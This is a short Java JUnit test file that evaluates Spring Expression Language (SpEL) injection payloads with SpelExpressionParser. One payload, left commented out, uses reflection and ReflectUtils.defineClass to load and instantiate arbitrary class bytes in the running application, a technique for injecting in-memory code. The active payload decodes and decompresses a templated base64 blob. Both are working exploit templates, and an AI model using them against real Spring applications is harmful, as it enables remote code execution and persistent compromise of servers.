import org.junit.jupiter.api.Test;
import org.springframework.expression.spel.standard.SpelExpressionParser;

/**
 * @author ReaJason
 * @since 2025/9/2
 */
class SpELServletTest {

    @Test
    void test() {
//        String data = "#clazz = ''.class.forName('org.springframework.cglib.core.ReflectUtils').getMethod('defineClass', ''.class, ''.class.forName('[B'), ''.class.forName('java.lang.ClassLoader')).invoke(null, '{{className}}', #classBytes, ''.class.forName('java.lang.Thread').getMethod('currentThread').invoke(null).getContextClassLoader()), #clazz.newInstance()";
        String data = "''.class.forName('org.springframework.util.StreamUtils').getMethod('copyToByteArray', ''.class.forName('java.io.InputStream')).invoke(null, ''.class.forName('java.util.zip.GZIPInputStream').getConstructor(''.class.forName('java.io.InputStream')).newInstance(''.class.forName('java.io.ByteArrayInputStream').getConstructor(''.class.forName('[B')).newInstance(''.class.forName('org.springframework.util.Base64Utils').getMethod('decodeFromString', ''.class).invoke(null, '{{base64Str}}'))))";
        System.out.println(new SpelExpressionParser().parseExpression(data).getValue());
    }
}